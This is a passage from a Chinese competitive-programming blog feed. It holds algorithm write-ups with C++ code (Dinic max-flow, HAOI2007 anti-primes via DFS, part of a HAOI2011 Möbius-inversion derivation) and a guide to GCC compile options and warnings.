v-&gt;e[r].f -= flow;</span><br><span class="line">                    <span class="keyword">return</span> flow;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> t, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">level</span>(&amp;nodes[s], &amp;nodes[t], n)) &#123;</span><br><span class="line">            <span class="type">int</span> f;</span><br><span class="line">            <span class="keyword">while</span> ((f = <span class="built_in">find</span>(&amp;nodes[s], &amp;nodes[t])) &gt; <span class="number">0</span>) res += f;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;m, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;Node&gt; <span class="title">nodes</span><span class="params">(n + <span class="number">2</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) nodes[i].id = i;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> u, v;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;u, &amp;v) != EOF &amp;&amp; u != <span class="number">-1</span> &amp;&amp; v != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">addEdge</span>(&amp;nodes[u], &amp;nodes[v], INT_MAX);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) <span class="built_in">addEdge</span>(&amp;nodes[<span class="number">0</span>], &amp;nodes[i], <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = m + <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">addEdge</span>(&amp;nodes[i], &amp;nodes[n + <span class="number">1</span>], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function">Dinic <span class="title">dinic</span><span class="params">(nodes)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">dinic</span>(<span class="number">0</span>, n + <span class="number">1</span>, n + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;[u, v, c, f, r] : nodes[i].e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (u != &amp;nodes[<span class="number">0</span>] &amp;&amp; v != &amp;nodes[<span class="number">0</span>] &amp;&amp; u != &amp;nodes[n + <span class="number">1</span>] &amp;&amp; v != &amp;nodes[n + <span class="number">1</span>] &amp;&amp; f) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, u-&gt;id, v-&gt;id);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>网络流</tag>
        <tag>最大流</tag>
      </tags>
  </entry>
  <entry>
    <title>「HAOI2007」反素数 - 数论 + DFS</title>
    <url>/haoi2007-ant/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P1463">洛谷链接</a></p>
<p><a href="https://loj.ac/p/10203">LibreOJ 链接</a></p>
<p>对于任何正整数 <span
class="math inline">\(x\)</span>，其约数的个数记作 <span
class="math inline">\(g(x)\)</span>。例如 <span
class="math inline">\(g(1) = 1\)</span>，<span
class="math inline">\(g(6) = 4\)</span>。</p>
<p>如果某个正整数 <span class="math inline">\(x\)</span> 满足：<span
class="math inline">\(\forall 0 &lt; i &lt; x\)</span>，都有 <span
class="math inline">\(g(x) &lt; g(i)\)</span>，则称 <span
class="math inline">\(x\)</span> 为反质数。例如，整数 <span
class="math inline">\(1, 2, 4, 6\)</span> 等都是反质数。</p>
<p>现在给定一个数 <span class="math inline">\(N\)</span>，你能求出不超过
<span class="math inline">\(N\)</span> 的最大的反质数么？</p>
<p>数据范围：<span class="math inline">\(1 \leq N \leq 2 \times
10^9\)</span></p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<h2 id="数学证明">数学证明</h2>
<p>首先我们有如下结论：</p>
<ol type="1">
<li><p>小于等于 <span class="math inline">\(N\)</span>
的最大反质数为约数个数中多的数中最小的一个。</p></li>
<li><p>小于等于 <span class="math inline">\(N\)</span>
的不同的质因数个数都不会超过 <span
class="math inline">\(10\)</span>，且所有质因数个数的和不超过 <span
class="math inline">\(30\)</span>。</p></li>
<li><p>若 <span class="math inline">\(x\)</span> 为反质数，则 <span
class="math inline">\(x\)</span> 必定满足： <span
class="math display">\[
\begin{cases}
x = 2^{p_1} \times 3^{p_2} \times 5^{p_3} \times 7^{p_4} \times 11^{p_5}
\times 13^{p_6} \times 17^{p_7} \times 19^{p_8} \times 23^{p_9} \times
29^{p_{10}} \\
p_1 \geq p_2 \geq p_3 \geq \cdots \geq p_{10} \geq 0
\end{cases}
\]</span></p></li>
</ol>
<p>接下来为证明：</p>
<ol type="1">
<li><p>对于结论 <span class="math inline">\(1\)</span>，我们设 <span
class="math inline">\(x\)</span>
为约数最多的数中最小的一个。则有以下结论：</p>
<ol type="1">
<li><p><span class="math inline">\(\forall y &lt; x \Rightarrow g(y)
&lt; g(x)\)</span>，即 <span class="math inline">\(x\)</span>
为反质数。</p></li>
<li><p><span class="math inline">\(\forall y &gt; x \Rightarrow g(y)
\leq g(x)\)</span>，即大于 <span class="math inline">\(x\)</span>
的数都不为反质数。</p></li>
</ol></li>
<li><p>对于结论 <span class="math inline">\(2\)</span>，显然 <span
class="math inline">\(2 \times 3 \times 5 \times 7 \times 11 \times 13
\times 17 \times 19 \times 23 \times 29 \times 31&gt; 2 \times
10^9\)</span>， 故不可能会有拥有超过 <span
class="math inline">\(10\)</span> 个不同的质因数的数小于等于 <span
class="math inline">\(2 \times 10^9\)</span>。且 <span
class="math inline">\(2 ^ {31} &gt; 2 \times 10^9\)</span>，故小于 <span
class="math inline">\(2 \times 10^9\)</span> 的数的质因数个数不可能大于
<span class="math inline">\(30\)</span>。</p></li>
<li><p>对于结论 <span
class="math inline">\(3\)</span>，我们可以使用反证法。设 <span
class="math inline">\(x\)</span> 为反质数且满足 <span
class="math inline">\(i &lt; j\)</span> 且 <span
class="math inline">\(p_i &gt; p_j\)</span>，则令 <span
class="math inline">\(y\)</span> 的 <span
class="math inline">\(p_i\)</span> 项比 <span
class="math inline">\(x\)</span> 的 <span
class="math inline">\(p_i\)</span> 多 <span
class="math inline">\(1\)</span>，<span class="math inline">\(y\)</span>
的 <span class="math inline">\(p_j\)</span> 项比 <span
class="math inline">\(x\)</span> 的 <span
class="math inline">\(p_j\)</span> 少 <span
class="math inline">\(1\)</span>，<span class="math inline">\(p\)</span>
的其余项相等。显然 <span class="math inline">\(x &lt; y\)</span> 且
<span class="math inline">\(g(x) = g(y)\)</span>，<span
class="math inline">\(x\)</span>
不为反质数，故矛盾，原结论成立。</p></li>
</ol>
<h2 id="dfs">DFS</h2>
<p>接下来我们可以设最大反质数为:</p>
<p><span class="math display">\[
x = 2^{p_1} \times 3^{p_2} \times 5^{p_3} \times 7^{p_4} \times 11^{p_5}
\times 13^{p_6} \times 17^{p_7} \times 19^{p_8} \times 23^{p_9} \times
29^{p_{10}}
\]</span></p>
<p>通过 DFS 枚举 <span class="math inline">\(p\)</span>
数组的所有情况。时间复杂度小于 <span
class="math inline">\(O(n)\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> n;</span><br><span class="line"><span class="type">int</span> p[<span class="number">10</span>], pAns[<span class="number">10</span>], m[<span class="number">10</span>] = &#123; <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">power</span><span class="params">(<span class="type">long</span> <span class="type">long</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (b &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((b &amp; <span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">            ans *= a;</span><br><span class="line">        &#125;</span><br><span class="line">        a *= a;</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">calcP</span><span class="params">(<span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; end; i++) ans *= <span class="built_in">power</span>(m[i], p[i]);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">sumP</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) ans *= p[i] + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">calcAns</span><span class="params">(<span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; end; i++) ans *= <span class="built_in">power</span>(m[i], pAns[i]);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">sumAns</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) ans *= pAns[i] + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> step)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (step &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sumP</span>() &gt;= <span class="built_in">sumAns</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sumP</span>() &gt; <span class="built_in">sumAns</span>()) <span class="built_in">memcpy</span>(pAns, p, <span class="built_in">sizeof</span>(p));</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">calcP</span>(<span class="number">10</span>) &lt; <span class="built_in">calcAns</span>(<span class="number">10</span>)) <span class="built_in">memcpy</span>(pAns, p, <span class="built_in">sizeof</span>(p));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> maxn = <span class="built_in">calcP</span>(step), before = step == <span class="number">0</span> ? (<span class="type">long</span> <span class="type">long</span>) <span class="number">2e9</span> : p[step - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> <span class="type">long</span> i = <span class="number">0</span>; <span class="built_in">power</span>(m[step], i) * maxn &lt;= n &amp;&amp; i &lt;= before; i++) &#123;</span><br><span class="line">        p[step] = i;</span><br><span class="line">        <span class="built_in">dfs</span>(step + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(p, <span class="number">0</span>, <span class="built_in">sizeof</span>(p));</span><br><span class="line">    <span class="built_in">memset</span>(pAns, <span class="number">0</span>, <span class="built_in">sizeof</span>(pAns));</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">calcAns</span>(<span class="number">10</span>) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>省选</tag>
        <tag>数学</tag>
        <tag>DFS</tag>
        <tag>数论</tag>
        <tag>HAOI</tag>
        <tag>2007</tag>
        <tag>POI</tag>
        <tag>2001</tag>
      </tags>
  </entry>
  <entry>
    <title>GCC 使用及技巧</title>
    <url>/gcc-compiler/</url>
    <content><![CDATA[<blockquote>
<p>本文仅介绍 GCC 的使用以及在 OI 中使用的技巧，不涉及任何工程项目！</p>
</blockquote>
<h1 id="介绍">介绍</h1>
<p>GCC 不用多说，是指的 GNU 编写的 C  C++ 编译器。包含 gcc、g++、gdb
等软件。</p>
<span id="more"></span>
<h1 id="安装">安装</h1>
<p>大多数 C++ 的 IDE 都集成了 GCC（除了 Visual Studio 使用的 MSVC 和
Xcode 默认使用的是 Clang）（Visual Studio Code 和 Vim
等属于编辑器，不含有 GCC），若要安装 GCC 也很简单。</p>
<p>Windows 上可选择 <a
href="https://www.mingw-w64.org/">MinGW-w64</a>，macOS 可在安装 Homebrew
的基础上在终端输入 <code>brew install gcc</code> 安装。</p>
<p>Linux 上可使用 <code>sudo apt-get install build-essentia</code>
命令（对于 Debian 及其衍生发行版），对于其他发行版则使用
<code>sudo pacman -S gcc g++</code>（使用 Arch Linux 举例）。</p>
<p>如果你是 Windows 10 或 Windows 11 用户，强烈推荐使用 <a
href="https://docs.microsoft.com/zh-cn/windows/wsl/install">WSL2</a>
安装 Ubuntu，在 Ubuntu 中使用
GCC。这样可以避免本地与评测的环境差异。</p>
<p>安装成功后可用 <code>gcc -v</code> 或 <code>g++ -v</code>
检查安装。若安装成功应为下列输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xenonwzh@XenonWZH-Surface:~$ gcc -v</span><br><span class="line">Using built-in specs.</span><br><span class="line">COLLECT_GCC=gcc</span><br><span class="line">COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/9/lto-wrapper</span><br><span class="line">OFFLOAD_TARGET_NAMES=nvptx-none:hsa</span><br><span class="line">OFFLOAD_TARGET_DEFAULT=1</span><br><span class="line">Target: x86_64-linux-gnu</span><br><span class="line">Configured with: ../src/configure -v --with-pkgversion=&#x27;Ubuntu 9.4.0-1ubuntu1~20.04.1&#x27; --with-bugurl=file:///usr/share/doc/gcc-9/README.Bugs --enable-languages=c,ada,c++,go,brig,d,fortran,objc,obj-c++,gm2 --prefix=/usr --with-gcc-major-version-only --program-suffix=-9 --program-prefix=x86_64-linux-gnu- --enable-shared --enable-linker-build-id --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --libdir=/usr/lib --enable-nls --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --with-default-libstdcxx-abi=new --enable-gnu-unique-object --disable-vtable-verify --enable-plugin --enable-default-pie --with-system-zlib --with-target-system-zlib=auto --enable-objc-gc=auto --enable-multiarch --disable-werror --with-arch-32=i686 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --enable-multilib --with-tune=generic --enable-offload-targets=nvptx-none=/build/gcc-9-Av3uEd/gcc-9-9.4.0/debian/tmp-nvptx/usr,hsa --without-cuda-driver --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu</span><br><span class="line">Thread model: posix</span><br><span class="line">gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)</span><br></pre></td></tr></table></figure>
<h1 id="部分-ide-与编辑器下-gcc-的设置">部分 IDE 与编辑器下 GCC
的设置</h1>
<h2 id="dev-c">Dev-C++</h2>
<p>Dev-C++ 可在菜单栏中选择 工具，编译选项。之后会弹出下列窗口。</p>
<img src="/gcc-compiler/gcc-devcpp.png" class="">
<p>在窗口中“编译时加入一下命令”打勾，可在里面输入 GCC 参数（不含
<code>-o test</code>）。</p>
<h2 id="visual-studio-code">Visual Studio Code</h2>
<h3 id="code-runner">Code Runner</h3>
<p>在 Visual Studio Code 设置中点击“打开设置（json）”，在该 json
文件最外层大括号末尾添加下列语句：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;code-runner.executorMap&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cpp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cd $dir &amp;&amp; g++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>即可在 <code>"cpp"</code> 对应的字符串中修改 <code>g++</code>
参数。</p>
<h3 id="c-c-官方扩展">C / C++ 官方扩展</h3>
<p>在 Visual Studio Code 中打开编写程序的文件夹，打开一个 C++
文件，在菜单栏中点击 终端、配置默认生成任务。之后在弹出的 json 文件中
修改 <code>"args"</code> 参数即可。</p>
<h3 id="clangd">clangd</h3>
<p>打开文件夹，在文件夹下新建 <code>compile_flags.txt</code>
文件，在该文件中添加 GCC 编译选项即可（同样不含
<code>-o test</code>）</p>
<h1 id="编译">编译</h1>
<p>下文将以 <code>g++</code> 举例，<code>gcc</code> 同理。</p>
<p>GCC 可编译单文件，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g++ test.cpp</span><br></pre></td></tr></table></figure>
<p>此时可生成一个文件 <code>a.out</code>（Windows 下为
<code>a.exe</code>）。</p>
<p>若想让生成的程序变成指定文件名，可使用下列语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g++ test.cpp -o test</span><br></pre></td></tr></table></figure>
<p>此时会生成名为 <code>test</code> 的文件（Windows 下为
<code>test.exe</code>）</p>
<p>若想使用新版本的特性，可使用下列指令（以 ISO C++ 14 为例）（目前的
NOI 系列比赛使用的 GCC 已默认开启 ISO C++ 14）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g++ test.cpp -std=c++14</span><br></pre></td></tr></table></figure>
<p>若想开启 O2 优化，可使用下列指令目前的 NOI 系列比赛使用的 GCC
<strong>未</strong> 默认开启 O2）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g++ test.cpp -O2</span><br></pre></td></tr></table></figure>
<p>若想使用 GDB 调试，则可以使用下列语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g++ test.cpp -g</span><br><span class="line">gdb a.out</span><br></pre></td></tr></table></figure>
<p>以上如
<code>-o</code>、<code>-std=c++14</code>、<code>-O2</code>、<code>-g</code>
以及下列将介绍的参数均可叠加使用。</p>
<h2 id="与-oi-无关的知识点">与 OI 无关的知识点</h2>
<p>众所周知宏观的编译操作分为编译、链接两大操作，GCC
也支持编译以及链接操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g++ test.cpp -c  # 编译，生成对象文件 test.o</span><br><span class="line">g++ test.o       # 链接，生成可执行文件 a.out</span><br></pre></td></tr></table></figure>
<h1 id="警告">警告</h1>
<p>GCC 编译会产生警告乃至报错，例如在 A + B Problem
中的输出语句忘加分号就会产生下列情况：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xenonwzh@XenonWZH-Laptop:~$ g++ test.cpp -O2 -o test</span><br><span class="line">test.cpp: In function ‘int main()’:</span><br><span class="line">test.cpp:6:36: error: expected ‘;’ before ‘return’</span><br><span class="line">    6 |     std::cout &lt;&lt; a + b &lt;&lt; std::endl</span><br><span class="line">      |                                    ^</span><br><span class="line">      |                                    ;</span><br><span class="line">    7 |     return 0;</span><br><span class="line">      |     ~~~~~~</span><br></pre></td></tr></table></figure>
<p>该情况为报错，导致程序无法通过编译。</p>
<p>又例如在程序中定义了一个变量但始终未使用，编译将出现下列情况：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xenonwzh@XenonWZH-Laptop:~$ g++ test.cpp -O2 -Wall -o test</span><br><span class="line">test.cpp: In function ‘int main()’:</span><br><span class="line">test.cpp:4:15: warning: unused variable ‘c’ [-Wunused-variable]</span><br><span class="line">    4 |     int a, b, c;</span><br><span class="line">      |</span><br></pre></td></tr></table></figure>
<p>该情况为警告，程序可以通过编译，但可能在运行中得不到想要的答案，若你对自己的程序很有把握可以忽略警告。</p>
<h2 id="产生更多的警告">产生更多的警告</h2>
<p>由于 GCC 能产生的警告少之又少，同时如 <code>=</code> 与
<code>==</code> 不分等常见错误在 GCC
的默认设置下不会警告，所以我们一般会在编译中添加参数以生成更多的警告，用法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g++ test.cpp -Wall</span><br></pre></td></tr></table></figure>
<p>利用该命令就可以产生如上一个例子的警告。</p>
<h2 id="忽略特定的警告">忽略特定的警告</h2>
<p>由于开启了 <code>-Wall</code>
容易误伤，所以我们可以利用参数忽略特定的警告。</p>
<p>例如我们使用了 <code>scanf</code> 函数，但是 GCC
警告我们没有使用该函数的返回值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test.cpp: In function ‘int main()’:</span><br><span class="line">test.cpp:18:14: warning: ignoring return value of ‘int scanf(const char*, ...)’, declared with attribute warn_unused_result [-Wunused-result]</span><br><span class="line">   18 |         scanf(&quot;%d%d%d&quot;, &amp;x, &amp;y, &amp;z);</span><br><span class="line">      |         ~~~~~^~~~~~~~~~~~~~~~~~~~~~</span><br></pre></td></tr></table></figure>
<p>我们可以在其中提取警告的类型。我们看到了
<code>[-Wunused-result]</code>，说明该类型为
<code>unused-result</code>。</p>
<p>我们可以使用 <code>-Wno</code> 参数来忽略警告，使用时应在
<code>-Wno</code> 后紧跟警告类型，例子如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g++ test.cpp -Wall -Wno-unused-result</span><br></pre></td></tr></table></figure>
<p>接下来就没有烦人的未使用 <code>scanf</code> 返回值的警告了。</p>
<h1 id="宏定义">宏定义</h1>
<p>我们可以利用 GCC 编译来代替 C++ 中简单的宏定义。</p>
<p>参数为 <code>-D</code>，使用时应紧跟定义宏。例子如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g++ test.cpp -DDEBUG</span><br></pre></td></tr></table></figure>
<p>其中 <code>-DDEBUG</code> 相当于在 <code>test.cpp</code>
中添加下列语句：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG</span></span><br></pre></td></tr></table></figure>
<p>该参数可在调试或其他场合中使用，非常方便。</p>
<p>例如把调试的语句在定义 DEBUG 宏时才执行，文件输入输出在没定义 DEBUG
时执行，在考场上可有效避免非知识原因的爆 0。</p>
<p>同时注意在绝大多数 OJ 编译代码时参数都含有
<code>-DONLINE_JUDGE</code>，可以利用该特性提升刷题体验。</p>
]]></content>
      <categories>
        <category>OI</category>
        <category>其他</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>「HAOI2011」Problem b - 莫比乌斯反演</title>
    <url>/haoi2011-problemb/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2522">洛谷链接</a></p>
<p>对于给出的 <span class="math inline">\(n\)</span>
个询问，每次求有多少个数对 <span
class="math inline">\((x,y)\)</span>，满足 <span class="math inline">\(a
\le x \le b\)</span>，<span class="math inline">\(c \le y \le
d\)</span>，且 <span class="math inline">\(\gcd(x,y) = k\)</span>，<span
class="math inline">\(\gcd(x,y)\)</span> 函数为 <span
class="math inline">\(x\)</span> 和 <span
class="math inline">\(y\)</span> 的最大公约数。</p>
<p>对于 <span class="math inline">\(100\%\)</span> 的数据满足：<span
class="math inline">\(1 \le n,k \le 5 \times 10^4\)</span>，<span
class="math inline">\(1 \le a \le b \le 5 \times 10^4\)</span>，<span
class="math inline">\(1 \le c \le d \le 5 \times 10^4\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题要求以下式子的值：</p>
<p><span class="math display">\[
\sum_{x = a}^b{ \sum_{y = c}^d{ [\gcd(x, y) = k] } }
\]</span></p>
<p>看到单元函数我们可以想到尝试用莫比乌斯反演化简。</p>
<p>首先我们设函数 <span class="math inline">\(A(n, m, k) = \sum_{i =
1}^n{ \sum_{j = 1}^m{ [\gcd(i, j) = k] }
}\)</span>，由容斥原理易得答案为 <span class="math inline">\(A(b, d, k)
- A(a - 1, d, k) - A(b, c - 1, k) + A(a - 1, c - 1, k)\)</span>。</p>
<p>于是我们只需求出 <span class="math inline">\(A(n, m, k)\)</span>
的值即可。设以下函数：</p>
<p><span class="math display">\[
f(k) = \sum_{i = 1}^n{ \sum_{j = 1}^m{ [\gcd(i, j) = k] } }
\]</span></p>
<p><span class="math display">\[
F(d) = \sum_{d | k}{f(k)}
\]</span></p>
<p>我们可以将函数 <span class="math inline">\(F(d)\)</span>
进行化简：</p>
<p><span class="math display">\[
\begin{align*}
F(d) &amp;= \sum_{d | k}{f(k)} \\
&amp;= \sum_{d | k}{ \sum_{i = 1}^n{ \sum_{j = 1}^m{ [\gcd(i, j) = k] }
} } \\
&amp;= \sum_{t = 1}^{ \min\{ \lfloor \frac{n}{d} \rfloor , \lfloor
\frac{m}{d} \rfloor \} }{ \sum_{i = 1}^n{ \sum_{j = 1}^m{ [\gcd(i, j) =
td] } } } \\
&amp;= \sum_{i = 1}^n{ \sum_{j = 1}^m{ [d | \gcd(i, j)] } } \\
&amp;= \sum_{i = 1}^n{ \sum_{j = 1}^m{ [d | i][d | j] } } \\
&amp;= \lfloor \frac{n}{d} \rfloor \lfloor \frac{m}{d} \rfloor
\end{align*}
\]</span></p>
<p>又由于 <span class="math inline">\(F(d) = \sum_{d |
k}{f(k)}\)</span>，我们可以进行莫比乌斯反演：</p>
<p><span class="math display">\[
f(k) = \sum_{k | d}{\mu(\frac{d}{k})F(d)}
\]</span></p>
<p>然后接着进行化简：</p>
<p><span class="math display">\[
\begin{align*}
f(k) &amp;= \sum_{k | d}{\mu(\frac{d}{k})F(d)} \\
&amp;= \sum_{k | d}{\mu(\frac{d}{k}) \lfloor \frac{n}{d} \rfloor \lfloor
\frac{m}{d} \rfloor } \\
&amp;= \sum_{t = 1}^{ \min\{ \lfloor \frac{n}{k} \rfloor , \lfloor
\frac{m}{k} \rfloor \} }{\mu(t) \lfloor \frac{n}{tk} \rfloor \lfloor
\frac{m}{tk} \rfloor }
\end{align*}
\]</span></p>
<p>于是我们可以得出：</p>
<p><span class="math display">\[
A(n, m, k) = \sum_{t = 1}^{ \min\{ \lfloor \frac{n}{k} \rfloor , \lfloor
\frac{m}{k} \rfloor \} }{\mu(t) \lfloor \frac{n}{tk} \rfloor \lfloor
\frac{m}{tk} \rfloor }
\]</span></p>
<p>此时对于单词询问的时间复杂度为 <span
class="math inline">\(O(n)\)</span>，直接运行 <span
class="math inline">\(A(n, m, k)\)</span> 会
TLE，故我们还要进行进一步的优化。</p>
<p>我们可以发现在 <span class="math inline">\(A(n, m, k)\)</span>
中大量出现 <span class="math inline">\(\lfloor \frac{n}{k}
\rfloor\)</span> 与 <span class="math inline">\(\lfloor \frac{m}{k}
\rfloor\)</span>，于是我们可以考虑将其提前计算。</p>
<p>我们定义以下函数：</p>
